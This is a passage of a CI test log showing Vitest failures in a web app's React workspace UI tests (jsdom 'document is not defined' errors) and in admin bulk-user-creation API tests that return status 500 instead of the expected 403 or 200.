2025-11-18T17:36:11.2927259Z     [90m152| [39m        <MockAssignmentCard
2025-11-18T17:36:11.2927754Z     [90m153| [39m          assignment={mockAssignment}
2025-11-18T17:36:11.2927769Z 
2025-11-18T17:36:11.2928185Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[181/545]⎯[22m[39m
2025-11-18T17:36:11.2928201Z 
2025-11-18T17:36:11.2930119Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mClick Interactions[2m > [22mshould trigger assignment click when card is clicked outside discussion link
2025-11-18T17:36:11.2931226Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.2932383Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.2933469Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.2934164Z [36m [2m❯[22m tests/workspace/discussionLinkUI.test.tsx:[2m170:30[22m[39m
2025-11-18T17:36:11.2934736Z     [90m168| [39m      const onDiscussionClick = vi.fn((e) => e.stopPropagation());
2025-11-18T17:36:11.2935098Z     [90m169| [39m      const onAssignmentClick = vi.fn();
2025-11-18T17:36:11.2935431Z     [90m170| [39m      const user = userEvent.setup();
2025-11-18T17:36:11.2935745Z     [90m   | [39m                             [31m^[39m
2025-11-18T17:36:11.2935936Z     [90m171| [39m
2025-11-18T17:36:11.2936190Z     [90m172| [39m      render(
2025-11-18T17:36:11.2936206Z 
2025-11-18T17:36:11.2936632Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[182/545]⎯[22m[39m
2025-11-18T17:36:11.2936649Z 
2025-11-18T17:36:11.2938661Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mHover Effects[2m > [22mshould apply hover styles to discussion link
2025-11-18T17:36:11.2939808Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.2941142Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.2942237Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.2942896Z [36m [2m❯[22m tests/workspace/discussionLinkUI.test.tsx:[2m191:30[22m[39m
2025-11-18T17:36:11.2943280Z     [90m189| [39m  describe('Hover Effects', () => {
2025-11-18T17:36:11.2943858Z     [90m190| [39m    it('should apply hover styles to discussion link', async () => {
2025-11-18T17:36:11.2944259Z     [90m191| [39m      const user = userEvent.setup();
2025-11-18T17:36:11.2944594Z     [90m   | [39m                             [31m^[39m
2025-11-18T17:36:11.2944770Z     [90m192| [39m
2025-11-18T17:36:11.2944995Z     [90m193| [39m      render(
2025-11-18T17:36:11.2945009Z 
2025-11-18T17:36:11.2945376Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[183/545]⎯[22m[39m
2025-11-18T17:36:11.2945394Z 
2025-11-18T17:36:11.2947136Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mAccessibility[2m > [22mshould have proper button role for discussion link
2025-11-18T17:36:11.2947657Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.2948449Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.2949084Z [36m [2m❯[22m tests/workspace/discussionLinkUI.test.tsx:[2m215:7[22m[39m
2025-11-18T17:36:11.2949439Z     [90m213| [39m  describe('Accessibility', () => {
2025-11-18T17:36:11.2949982Z     [90m214| [39m    it('should have proper button role for discussion link', () => {
2025-11-18T17:36:11.2950222Z     [90m215| [39m      render(
2025-11-18T17:36:11.2950461Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.2950753Z     [90m216| [39m        <MockAssignmentCard
2025-11-18T17:36:11.2951096Z     [90m217| [39m          assignment={mockAssignment}
2025-11-18T17:36:11.2951110Z 
2025-11-18T17:36:11.2951503Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[184/545]⎯[22m[39m
2025-11-18T17:36:11.2951517Z 
2025-11-18T17:36:11.2952883Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mAccessibility[2m > [22mshould be keyboard navigable
2025-11-18T17:36:11.2953959Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.2955052Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.2956314Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.2957139Z [36m [2m❯[22m tests/workspace/discussionLinkUI.test.tsx:[2m230:30[22m[39m
2025-11-18T17:36:11.2957586Z     [90m228| [39m    it('should be keyboard navigable', async () => {
2025-11-18T17:36:11.2958142Z     [90m229| [39m      const onDiscussionClick = vi.fn((e) => e.stopPropagation());
2025-11-18T17:36:11.2958496Z     [90m230| [39m      const user = userEvent.setup();
2025-11-18T17:36:11.2958821Z     [90m   | [39m                             [31m^[39m
2025-11-18T17:36:11.2958992Z     [90m231| [39m
2025-11-18T17:36:11.2959227Z     [90m232| [39m      render(
2025-11-18T17:36:11.2959240Z 
2025-11-18T17:36:11.2959611Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[185/545]⎯[22m[39m
2025-11-18T17:36:11.2959624Z 
2025-11-18T17:36:11.2961161Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mDynamic Updates[2m > [22mshould update comment count when prop changes
2025-11-18T17:36:11.2961635Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.2962404Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.2963230Z [36m [2m❯[22m tests/workspace/discussionLinkUI.test.tsx:[2m254:28[22m[39m
2025-11-18T17:36:11.2963600Z     [90m252| [39m  describe('Dynamic Updates', () => {
2025-11-18T17:36:11.2964106Z     [90m253| [39m    it('should update comment count when prop changes', () => {
2025-11-18T17:36:11.2964435Z     [90m254| [39m      const { rerender } = render(
2025-11-18T17:36:11.2964784Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.2965107Z     [90m255| [39m        <MockAssignmentCard
2025-11-18T17:36:11.2965482Z     [90m256| [39m          assignment={mockAssignment}
2025-11-18T17:36:11.2965514Z 
2025-11-18T17:36:11.2965906Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[186/545]⎯[22m[39m
2025-11-18T17:36:11.2965920Z 
2025-11-18T17:36:11.2967565Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mEdge Cases[2m > [22mshould handle very large comment counts
2025-11-18T17:36:11.2968087Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.2968885Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.2969483Z [36m [2m❯[22m tests/workspace/discussionLinkUI.test.tsx:[2m282:7[22m[39m
2025-11-18T17:36:11.2969819Z     [90m280| [39m  describe('Edge Cases', () => {
2025-11-18T17:36:11.2970304Z     [90m281| [39m    it('should handle very large comment counts', () => {
2025-11-18T17:36:11.2970574Z     [90m282| [39m      render(
2025-11-18T17:36:11.2970823Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.2971120Z     [90m283| [39m        <MockAssignmentCard
2025-11-18T17:36:11.2971501Z     [90m284| [39m          assignment={mockAssignment}
2025-11-18T17:36:11.2971519Z 
2025-11-18T17:36:11.2971928Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[187/545]⎯[22m[39m
2025-11-18T17:36:11.2971943Z 
2025-11-18T17:36:11.2973468Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mEdge Cases[2m > [22mshould handle negative comment counts as zero
2025-11-18T17:36:11.2973944Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.2974705Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.2975351Z [36m [2m❯[22m tests/workspace/discussionLinkUI.test.tsx:[2m295:7[22m[39m
2025-11-18T17:36:11.2975563Z     [90m293| [39m
2025-11-18T17:36:11.2976064Z     [90m294| [39m    it('should handle negative comment counts as zero', () => {
2025-11-18T17:36:11.2976315Z     [90m295| [39m      render(
2025-11-18T17:36:11.2977051Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.2977391Z     [90m296| [39m        <MockAssignmentCard
2025-11-18T17:36:11.2977785Z     [90m297| [39m          assignment={mockAssignment}
2025-11-18T17:36:11.2977800Z 
2025-11-18T17:36:11.2978177Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[188/545]⎯[22m[39m
2025-11-18T17:36:11.2978190Z 
2025-11-18T17:36:11.2980181Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/groupAssignmentComments.test.tsx[2m > [22mGroupAssignmentsContent - Comment Count Feature[2m > [22mComment Count Loading[2m > [22mshould load and display comment counts for assignments
2025-11-18T17:36:11.2980687Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.2981413Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.2982158Z [36m [2m❯[22m tests/workspace/groupAssignmentComments.test.tsx:[2m369:29[22m[39m
2025-11-18T17:36:11.2982411Z     [90m367| [39m      });
2025-11-18T17:36:11.2982622Z     [90m368| [39m
2025-11-18T17:36:11.2982951Z     [90m369| [39m      const { container } = render(
2025-11-18T17:36:11.2983259Z     [90m   | [39m                            [31m^[39m
2025-11-18T17:36:11.2983576Z     [90m370| [39m        <GroupAssignmentsContent
2025-11-18T17:36:11.2983891Z     [90m371| [39m          workspace={mockWorkspace}
2025-11-18T17:36:11.2983904Z 
2025-11-18T17:36:11.2984499Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[189/545]⎯[22m[39m
2025-11-18T17:36:11.2984534Z 
2025-11-18T17:36:11.2986520Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/groupAssignmentComments.test.tsx[2m > [22mGroupAssignmentsContent - Comment Count Feature[2m > [22mComment Count Loading[2m > [22mshould show "0 comentarios" when no comments exist
2025-11-18T17:36:11.2987243Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.2988030Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.2988727Z [36m [2m❯[22m tests/workspace/groupAssignmentComments.test.tsx:[2m410:7[22m[39m
2025-11-18T17:36:11.2988923Z     [90m408| [39m      });
2025-11-18T17:36:11.2989091Z     [90m409| [39m
2025-11-18T17:36:11.2989326Z     [90m410| [39m      render(
2025-11-18T17:36:11.2989581Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.2989951Z     [90m411| [39m        <GroupAssignmentsContent
2025-11-18T17:36:11.2990320Z     [90m412| [39m          workspace={mockWorkspace}
2025-11-18T17:36:11.2990335Z 
2025-11-18T17:36:11.2990724Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[190/545]⎯[22m[39m
2025-11-18T17:36:11.2990745Z 
2025-11-18T17:36:11.2992636Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/groupAssignmentComments.test.tsx[2m > [22mGroupAssignmentsContent - Comment Count Feature[2m > [22mComment Count Loading[2m > [22mshould handle singular/plural correctly
2025-11-18T17:36:11.2993142Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.2993847Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.2994561Z [36m [2m❯[22m tests/workspace/groupAssignmentComments.test.tsx:[2m451:7[22m[39m
2025-11-18T17:36:11.2994800Z     [90m449| [39m      });
2025-11-18T17:36:11.2994991Z     [90m450| [39m
2025-11-18T17:36:11.2995251Z     [90m451| [39m      render(
2025-11-18T17:36:11.2995527Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.2995891Z     [90m452| [39m        <GroupAssignmentsContent
2025-11-18T17:36:11.2996258Z     [90m453| [39m          workspace={mockWorkspace}
2025-11-18T17:36:11.2996275Z 
2025-11-18T17:36:11.2996728Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[191/545]⎯[22m[39m
2025-11-18T17:36:11.2996746Z 
2025-11-18T17:36:11.2999111Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/groupAssignmentComments.test.tsx[2m > [22mGroupAssignmentsContent - Comment Count Feature[2m > [22mDiscussion Link Navigation[2m > [22mshould navigate to discussion page when clicking discussion link
2025-11-18T17:36:11.3000103Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3000843Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3001560Z [36m [2m❯[22m tests/workspace/groupAssignmentComments.test.tsx:[2m471:7[22m[39m
2025-11-18T17:36:11.3002047Z     [90m469| [39m  describe('Discussion Link Navigation', () => {
2025-11-18T17:36:11.3002679Z     [90m470| [39m    it('should navigate to discussion page when clicking discussion li…
2025-11-18T17:36:11.3002925Z     [90m471| [39m      render(
2025-11-18T17:36:11.3003156Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3003476Z     [90m472| [39m        <GroupAssignmentsContent
2025-11-18T17:36:11.3003794Z     [90m473| [39m          workspace={mockWorkspace}
2025-11-18T17:36:11.3003807Z 
2025-11-18T17:36:11.3004183Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[192/545]⎯[22m[39m
2025-11-18T17:36:11.3004196Z 
2025-11-18T17:36:11.3006288Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/groupAssignmentComments.test.tsx[2m > [22mGroupAssignmentsContent - Comment Count Feature[2m > [22mDiscussion Link Navigation[2m > [22mshould prevent main card click when clicking discussion link
2025-11-18T17:36:11.3007029Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3007776Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3008659Z [36m [2m❯[22m tests/workspace/groupAssignmentComments.test.tsx:[2m498:7[22m[39m
2025-11-18T17:36:11.3009065Z     [90m496| [39m      const handleAssignmentClick = vi.fn();
2025-11-18T17:36:11.3009252Z     [90m497| [39m
2025-11-18T17:36:11.3009518Z     [90m498| [39m      render(
2025-11-18T17:36:11.3009786Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3010141Z     [90m499| [39m        <GroupAssignmentsContent
2025-11-18T17:36:11.3010488Z     [90m500| [39m          workspace={mockWorkspace}
2025-11-18T17:36:11.3010501Z 
2025-11-18T17:36:11.3010911Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[193/545]⎯[22m[39m
2025-11-18T17:36:11.3010925Z 
2025-11-18T17:36:11.3012845Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/groupAssignmentComments.test.tsx[2m > [22mGroupAssignmentsContent - Comment Count Feature[2m > [22mUI Display[2m > [22mshould show chat icon next to discussion text
2025-11-18T17:36:11.3013333Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3014032Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3014757Z [36m [2m❯[22m tests/workspace/groupAssignmentComments.test.tsx:[2m540:7[22m[39m
2025-11-18T17:36:11.3015111Z     [90m538| [39m  describe('UI Display', () => {
2025-11-18T17:36:11.3015667Z     [90m539| [39m    it('should show chat icon next to discussion text', async () => {
2025-11-18T17:36:11.3015921Z     [90m540| [39m      render(
2025-11-18T17:36:11.3016186Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3016573Z     [90m541| [39m        <GroupAssignmentsContent
2025-11-18T17:36:11.3017144Z     [90m542| [39m          workspace={mockWorkspace}
2025-11-18T17:36:11.3017161Z 
2025-11-18T17:36:11.3017553Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[194/545]⎯[22m[39m
2025-11-18T17:36:11.3017566Z 
2025-11-18T17:36:11.3019344Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/groupAssignmentComments.test.tsx[2m > [22mGroupAssignmentsContent - Comment Count Feature[2m > [22mUI Display[2m > [22mshould apply hover styles to discussion link
2025-11-18T17:36:11.3019845Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3020562Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3021283Z [36m [2m❯[22m tests/workspace/groupAssignmentComments.test.tsx:[2m562:7[22m[39m
2025-11-18T17:36:11.3021510Z     [90m560| [39m
2025-11-18T17:36:11.3022071Z     [90m561| [39m    it('should apply hover styles to discussion link', async () => {
2025-11-18T17:36:11.3022519Z     [90m562| [39m      render(
2025-11-18T17:36:11.3022758Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3023064Z     [90m563| [39m        <GroupAssignmentsContent
2025-11-18T17:36:11.3023381Z     [90m564| [39m          workspace={mockWorkspace}
2025-11-18T17:36:11.3023401Z 
2025-11-18T17:36:11.3023786Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[195/545]⎯[22m[39m
2025-11-18T17:36:11.3023805Z 
2025-11-18T17:36:11.3025728Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/groupAssignmentComments.test.tsx[2m > [22mGroupAssignmentsContent - Comment Count Feature[2m > [22mError Handling[2m > [22mshould handle errors when loading discussion counts
2025-11-18T17:36:11.3026253Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3027173Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3027857Z [36m [2m❯[22m tests/workspace/groupAssignmentComments.test.tsx:[2m604:7[22m[39m
2025-11-18T17:36:11.3028450Z     [90m602| [39m      const consoleErrorSpy = vi.spyOn(console, 'error').mockImplement…
2025-11-18T17:36:11.3028650Z     [90m603| [39m
2025-11-18T17:36:11.3028906Z     [90m604| [39m      render(
2025-11-18T17:36:11.3029173Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3029571Z     [90m605| [39m        <GroupAssignmentsContent
2025-11-18T17:36:11.3030134Z     [90m606| [39m          workspace={mockWorkspace}
2025-11-18T17:36:11.3030166Z 
2025-11-18T17:36:11.3030596Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[196/545]⎯[22m[39m
2025-11-18T17:36:11.3030613Z 
2025-11-18T17:36:11.3032517Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/groupAssignmentComments.test.tsx[2m > [22mGroupAssignmentsContent - Comment Count Feature[2m > [22mConsultant View[2m > [22mshould not show discussion links for consultants
2025-11-18T17:36:11.3032983Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3033690Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3034445Z [36m [2m❯[22m tests/workspace/groupAssignmentComments.test.tsx:[2m653:7[22m[39m
2025-11-18T17:36:11.3034655Z     [90m651| [39m      });
2025-11-18T17:36:11.3034844Z     [90m652| [39m
2025-11-18T17:36:11.3035095Z     [90m653| [39m      render(
2025-11-18T17:36:11.3035378Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3035760Z     [90m654| [39m        <GroupAssignmentsContent
2025-11-18T17:36:11.3036151Z     [90m655| [39m          workspace={mockWorkspace}
2025-11-18T17:36:11.3036186Z 
2025-11-18T17:36:11.3036592Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[197/545]⎯[22m[39m
2025-11-18T17:36:11.3036605Z 
2025-11-18T17:36:11.3038411Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/bulk-create-users.test.ts[2m > [22m/api/admin/bulk-create-users[2m > [22mAuthentication and Authorization[2m > [22mshould reject non-admin users
2025-11-18T17:36:11.3039075Z [31m[1mAssertionError[22m: expected 500 to be 403 // Object.is equality[39m
2025-11-18T17:36:11.3039110Z 
2025-11-18T17:36:11.3039252Z - Expected
2025-11-18T17:36:11.3039378Z + Received
2025-11-18T17:36:11.3039389Z 
2025-11-18T17:36:11.3039507Z - 403
2025-11-18T17:36:11.3039630Z + 500
2025-11-18T17:36:11.3039642Z 
2025-11-18T17:36:11.3040309Z [36m [2m❯[22m __tests__/api/admin/bulk-create-users.test.ts:[2m142:36[22m[39m
2025-11-18T17:36:11.3040666Z     [90m140| [39m      await handler(req, res);
2025-11-18T17:36:11.3040888Z     [90m141| [39m
2025-11-18T17:36:11.3041312Z     [90m142| [39m      expect(res._getStatusCode()).toBe(403);
2025-11-18T17:36:11.3041651Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.3042062Z     [90m143| [39m      expect(JSON.parse(res._getData())).toEqual({
2025-11-18T17:36:11.3042542Z     [90m144| [39m        error: 'Unauthorized. Only admins can bulk create users.'
2025-11-18T17:36:11.3042554Z 
2025-11-18T17:36:11.3042921Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[198/545]⎯[22m[39m
2025-11-18T17:36:11.3043169Z 
2025-11-18T17:36:11.3044730Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/bulk-create-users.test.ts[2m > [22m/api/admin/bulk-create-users[2m > [22mUser Creation[2m > [22mshould successfully create single user
2025-11-18T17:36:11.3045422Z [31m[1mAssertionError[22m: expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:36:11.3045441Z 
2025-11-18T17:36:11.3045580Z - Expected
2025-11-18T17:36:11.3045730Z + Received
2025-11-18T17:36:11.3045746Z 
2025-11-18T17:36:11.3045884Z - 200
2025-11-18T17:36:11.3046006Z + 500
2025-11-18T17:36:11.3046017Z 
2025-11-18T17:36:11.3046672Z [36m [2m❯[22m __tests__/api/admin/bulk-create-users.test.ts:[2m326:36[22m[39m
2025-11-18T17:36:11.3047167Z     [90m324| [39m      await handler(req, res);
2025-11-18T17:36:11.3047346Z     [90m325| [39m
2025-11-18T17:36:11.3047723Z     [90m326| [39m      expect(res._getStatusCode()).toBe(200);
2025-11-18T17:36:11.3048081Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.3048549Z     [90m327| [39m      const response = JSON.parse(res._getData());
2025-11-18T17:36:11.3048763Z     [90m328| [39m      
2025-11-18T17:36:11.3048783Z 
2025-11-18T17:36:11.3049165Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[199/545]⎯[22m[39m
2025-11-18T17:36:11.3049177Z 
2025-11-18T17:36:11.3050899Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/bulk-create-users.test.ts[2m > [22m/api/admin/bulk-create-users[2m > [22mUser Creation[2m > [22mshould handle multiple users in batches
2025-11-18T17:36:11.3051584Z [31m[1mAssertionError[22m: expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:36:11.3051598Z 
2025-11-18T17:36:11.3051721Z - Expected
2025-11-18T17:36:11.3051845Z + Received
2025-11-18T17:36:11.3051855Z 
2025-11-18T17:36:11.3051964Z - 200
2025-11-18T17:36:11.3052079Z + 500
2025-11-18T17:36:11.3052089Z 
2025-11-18T17:36:11.3052706Z [36m [2m❯[22m __tests__/api/admin/bulk-create-users.test.ts:[2m383:36[22m[39m
2025-11-18T17:36:11.3053034Z     [90m381| [39m      await handler(req, res);
2025-11-18T17:36:11.3053248Z     [90m382| [39m
2025-11-18T17:36:11.3053664Z     [90m383| [39m      expect(res._getStatusCode()).toBe(200);
2025-11-18T17:36:11.3054017Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.3054445Z     [90m384| [39m      const response = JSON.parse(res._getData());
2025-11-18T17:36:11.3054662Z     [90m385| [39m      
2025-11-18T17:36:11.3054678Z 
2025-11-18T17:36:11.3055088Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[200/545]⎯[22m[39m
2025-11-18T17:36:11.3055104Z 
2025-11-18T17:36:11.3056632Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/bulk-create-users.test.ts[2m > [22m/api/admin/bulk-create-users[2m > [22mUser Creation[2m > [22mshould handle existing users gracefully
2025-11-18T17:36:11.3057523Z [31m[1mAssertionError[22m: expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:36:11.3057538Z 
2025-11-18T17:36:11.3057672Z - Expected
2025-11-18T17:36:11.3057793Z + Received
2025-11-18T17:36:11.3057821Z 
2025-11-18T17:36:11.3057951Z - 200
2025-11-18T17:36:11.3058078Z + 500
2025-11-18T17:36:11.3058091Z 
2025-11-18T17:36:11.3058769Z [36m [2m❯[22m __tests__/api/admin/bulk-create-users.test.ts:[2m429:36[22m[39m
2025-11-18T17:36:11.3059092Z     [90m427| [39m      await handler(req, res);
2025-11-18T17:36:11.3059281Z     [90m428| [39m
2025-11-18T17:36:11.3059680Z     [90m429| [39m      expect(res._getStatusCode()).toBe(200);
2025-11-18T17:36:11.3060077Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.3060537Z     [90m430| [39m      const response = JSON.parse(res._getData());
2025-11-18T17:36:11.3060759Z     [90m431| [39m      
2025-11-18T17:36:11.3060772Z 
2025-11-18T17:36:11.3061144Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[201/545]⎯[22m[39m
2025-11-18T17:36:11.3061156Z 
2025-11-18T17:36:11.3062502Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/bulk-create-users.test.ts[2m > [22m/api/admin/bulk-create-users[2m > [22mUser Creation[2m > [22mshould validate passwords
2025-11-18T17:36:11.3063433Z [31m[1mAssertionError[22m: expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:36:11.3063450Z 
2025-11-18T17:36:11.3063578Z - Expected
2025-11-18T17:36:11.3063711Z + Received
2025-11-18T17:36:11.3063723Z 
2025-11-18T17:36:11.3063838Z - 200
2025-11-18T17:36:11.3063963Z + 500
2025-11-18T17:36:11.3063974Z 
2025-11-18T17:36:11.3064646Z [36m [2m❯[22m __tests__/api/admin/bulk-create-users.test.ts:[2m472:36[22m[39m
2025-11-18T17:36:11.3065004Z     [90m470| [39m      await handler(req, res);
2025-11-18T17:36:11.3065214Z     [90m471| [39m
2025-11-18T17:36:11.3065629Z     [90m472| [39m      expect(res._getStatusCode()).toBe(200);
2025-11-18T17:36:11.3065974Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.3066379Z     [90m473| [39m      const response = JSON.parse(res._getData());
2025-11-18T17:36:11.3066568Z     [90m474| [39m      
2025-11-18T17:36:11.3066579Z 
2025-11-18T17:36:11.3067135Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[202/545]⎯[22m[39m
2025-11-18T17:36:11.3067163Z 
2025-11-18T17:36:11.3068679Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/bulk-create-users.test.ts[2m > [22m/api/admin/bulk-create-users[2m > [22mUser Creation[2m > [22mshould include invalid users in results
